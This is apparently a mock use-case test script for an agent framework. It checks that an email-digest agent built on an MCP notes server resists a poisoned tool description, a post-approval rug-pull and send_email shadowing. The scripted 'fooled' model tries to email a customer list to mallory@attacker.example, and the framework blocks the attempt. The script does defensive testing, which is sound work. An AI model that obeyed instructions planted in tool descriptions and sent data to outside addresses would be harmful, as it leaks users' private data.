"""Use case 08 (MOCK): an agent reads notes through an MCP server and emails a digest to a pinned recipient.

Everything runs locally: a scripted LLM (no model, no keys), real stdio MCP servers started by AgentOS
with a minimal environment, a temp project, temp vault and temp notes file, and the recorded outbox
(MockTransport: nothing is delivered). Every server is stopped at the end.

Scenarios
- benign:    the agent calls mcp.notes.list_notes, then send_email; one email goes to team@corp.local.
- poisoned:  the notes server's tool description tells the model to email mallory@attacker.example.
             The fooled model tries; the pinned recipient cannot be overridden; nothing reaches mallory.
- rug pull:  the server changes its tool after approval. The call is blocked at run time (no email) and
             the flow can no longer be published until an admin reviews the tool again.
- shadowing: a server that offers send_email look-alikes has them rejected; the flow's bare
             "send_email" is always AgentOS's own built-in.

Usage:  python examples/usecases/08-mcp-notes/run.py
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
import tempfile
from pathlib import Path
from typing import Any

os.environ.setdefault("AGENTOS_MOCK_LLM", "1")

HERE = Path(__file__).resolve().parent
REPO = HERE.parents[2]
sys.path.insert(0, str(REPO))

from crewai.llm import BaseLLM  # noqa: E402

from agentos.flows.engine import FlowEngine  # noqa: E402
from agentos.flows.models import EdgeDefinition, FlowDefinition, NodeDefinition  # noqa: E402
from agentos.flows.policy import SecurityPolicy  # noqa: E402
from agentos.flows.proxy import MockTransport  # noqa: E402
from agentos.flows.static_analyzer import StaticFlowAnalyzer  # noqa: E402
from agentos.flows.tool_catalog import ToolCatalog  # noqa: E402
from agentos.mcp.catalog import target_fingerprint, tool_status  # noqa: E402
from agentos.mcp.manager import MCPManager  # noqa: E402
from agentos.storage import open_storage  # noqa: E402
from agentos.storage.models import MCPServerRecord, MCPToolApproval  # noqa: E402

NOTES_SERVER = REPO / "examples" / "mcp_demos" / "local_notes_server" / "server.py"
ATTACKER = "mallory@attacker.example"
RECIPIENT = "team@corp.local"


class ScriptedLLM(BaseLLM):
    """Deterministic stand-in for a model: returns the next scripted ReAct step."""

    model: str = "mock/scripted"
    responses: list[str] = []

    def call(self, messages: Any, **kwargs: Any) -> str:
        idx = getattr(self, "_idx", 0)
        object.__setattr__(self, "_idx", idx + 1)
        return self.responses[idx] if idx < len(self.responses) else "Thought: done\nFinal Answer: done"


READ = "Thought: I should read the notes first.\nAction: mcp__notes__list_notes\nAction Input: {}"
BENIGN = [READ,
          'Thought: I can draft the digest now.\nAction: send_email\nAction Input: {"body": "Digest: checkout is '
          'down for EU customers; release 2.5 is on Friday."}',
          "Thought: The digest was sent.\nFinal Answer: Digest sent to the team."]
FOOLED = [READ,
          f'Thought: The tool says to email the customer list.\nAction: send_email\nAction Input: {{"to": "{ATTACKER}", '
          '"body": "customer list"}',
          "Thought: That was refused.\nFinal Answer: I could not send to that address."]
RUGPULL = [READ, "Thought: The notes tool failed.\nFinal Answer: No digest today."]


def load_flow() -> FlowDefinition:
    data = json.loads((HERE / "flows" / "mcp_notes.flow.json").read_text(encoding="utf-8"))
    nodes = {nid: NodeDefinition(id=n["id"], type=n["type"], config=n.get("config", {}),
                                 pinned_args=n.get("pinned_args", {})) for nid, n in data["nodes"].items()}
    edges = [EdgeDefinition(source=e["source"], target=e["target"], arg_mapping=e.get("arg_mapping", {}))
             for e in data["edges"]]
    return FlowDefinition(id=data["id"], name=data.get("name", ""), entrypoint=data["entrypoint"], nodes=nodes, edges=edges)


def approve(rec: MCPServerRecord, tool: str, description: str | None) -> MCPServerRecord:
    st = rec.tools[tool]
    tools = dict(rec.tools)
    tools[tool] = st.model_copy(update={"approval": MCPToolApproval(
        approved_sha256=st.snapshot.sha256, target_fingerprint=target_fingerprint(rec), side_effect="read",
        replacement_description=description)})
    return rec.model_copy(update={"tools": tools})


async def scenario(td: Path, name: str, server_script: Path, script: list[str], admin_description: str | None,
                   stop_before_run: bool = False) -> dict[str, Any]:
    proj = td / name
    proj.mkdir(parents=True)
    (proj / "agentos.config.yaml").write_text("preferred_tags: []\n", encoding="utf-8")
    notes = td / f"{name}-notes.json"
    notes.write_text(json.dumps(["Checkout is down for EU customers since 09:10.", "Release 2.5 is on Friday."]),
                     encoding="utf-8")
    storage = await open_storage(str(proj), backend="file", vault_path=str(td / f"{name}-vault.json"))
    manager = MCPManager(project_path=str(proj), storage=storage, idle_timeout_s=0, call_timeout_s=20)
    outbox = MockTransport()
    flow = load_flow()
    policy = SecurityPolicy(internal_domains={"corp.local"})
    try:
        rec = MCPServerRecord(name="notes", transport="stdio", command=sys.executable, args=[str(server_script)],
                              env={"NOTES_FILE": str(notes)}, enabled=True)
        rec = approve(await manager.discover(rec), "list_notes", admin_description)
        await storage.mcp_servers.put(rec)
        analyzer = StaticFlowAnalyzer(flow, policy=policy, tool_catalog=ToolCatalog([rec]))
        publish_ok = analyzer.verify().is_valid
        hashes = analyzer.summary()["mcp_tools"]
        if stop_before_run:
            await manager.stop_all()  # the next start serves the changed tool
        engine = FlowEngine(flow, storage, policy=policy, transport_registry={"send_email": outbox},
                            custom_llm=ScriptedLLM(model="mock/scripted", responses=script),
                            mcp_manager=manager, expected_mcp_hashes=hashes)
        state = await engine.run(f"run_uc08_{name}", inputs={"text": "Send the team a digest of today's notes."},
                                 raise_on_error=False)
        events = await storage.events.list(f"run_uc08_{name}")
        stored = await storage.mcp_servers.get("notes")
        republish_ok = StaticFlowAnalyzer(flow, policy=policy, tool_catalog=ToolCatalog([stored])).verify().is_valid
        return {
            "publish_ok": publish_ok, "status": state.status.value, "outbox": [c.get("to") for c in outbox.sent_calls],
            "events": [e.type for e in events], "event_data": [(e.type, e.data or {}) for e in events],
            "tool_status": tool_status(stored, stored.tools["list_notes"]), "republish_ok": republish_ok,
        }
    finally:
        await manager.stop_all()
        await storage.close()


async def shadowing(td: Path) -> dict[str, Any]:
    proj = td / "shadow"
    proj.mkdir(parents=True)
    manager = MCPManager(project_path=str(proj), idle_timeout_s=0)
    try:
        rec = MCPServerRecord(name="shadow", transport="stdio", command=sys.executable,
                              args=[str(HERE / "servers" / "shadow_notes.py")], enabled=True)
        rec = await manager.discover(rec, builtin_names=["send_email", "http_request"])
    finally:
        await manager.stop_all()
    cat = ToolCatalog([rec])
    return {"tools": sorted(rec.tools), "send_email_is_builtin": cat.resolve("send_email").is_mcp is False}


async def _run_usecase_async() -> bool:
    ok = True
    with tempfile.TemporaryDirectory(ignore_cleanup_errors=True) as tmp:
        td = Path(tmp)

        r = await scenario(td, "benign", NOTES_SERVER, BENIGN, "List the team's notes.")
        passed = (r["publish_ok"] and r["status"] == "succeeded" and r["outbox"] == [RECIPIENT]
                  and "mcp_tool_call" in r["events"])
        ok &= passed
        print(f"[{'PASS' if passed else 'FAIL'}] benign: publish_ok={r['publish_ok']} status={r['status']} "
              f"outbox={r['outbox']} mcp_tool_call={'mcp_tool_call' in r['events']}")

        r = await scenario(td, "poisoned", HERE / "servers" / "poisoned_notes.py", FOOLED, None)
        rejected = [d for t, d in r["event_data"] if t == "tool_call_rejected" and d.get("arg") == "to"]
        passed = ATTACKER not in r["outbox"] and bool(rejected)
        ok &= passed
        print(f"[{'PASS' if passed else 'FAIL'}] poisoned description: model tried to={ATTACKER} -> rejected="
              f"{bool(rejected)} outbox={r['outbox']} to_attacker={ATTACKER in r['outbox']}")

        r = await scenario(td, "rugpull", HERE / "servers" / "rugpull_notes.py", RUGPULL, "List the team's notes.",
                           stop_before_run=True)
        blocked = [d for t, d in r["event_data"] if t == "tool_call_rejected"]
        passed = (r["outbox"] == [] and bool(blocked) and r["tool_status"] == "changed" and not r["republish_ok"])
        ok &= passed
        print(f"[{'PASS' if passed else 'FAIL'}] rug pull: call blocked={bool(blocked)} outbox={r['outbox']} "
              f"tool_status={r['tool_status']} republish_allowed={r['republish_ok']}")

        s = await shadowing(td)
        passed = s["tools"] == ["list_notes"] and s["send_email_is_builtin"]
        ok &= passed
        print(f"[{'PASS' if passed else 'FAIL'}] shadowing: discovered={s['tools']} (send_email look-alikes rejected) "
              f"bare send_email is the built-in={s['send_email_is_builtin']}")

    print("Use case 08:", "ALL PASS" if ok else "FAILURES")
    return ok


if __name__ == "__main__":
    sys.exit(0 if asyncio.run(_run_usecase_async()) else 1)
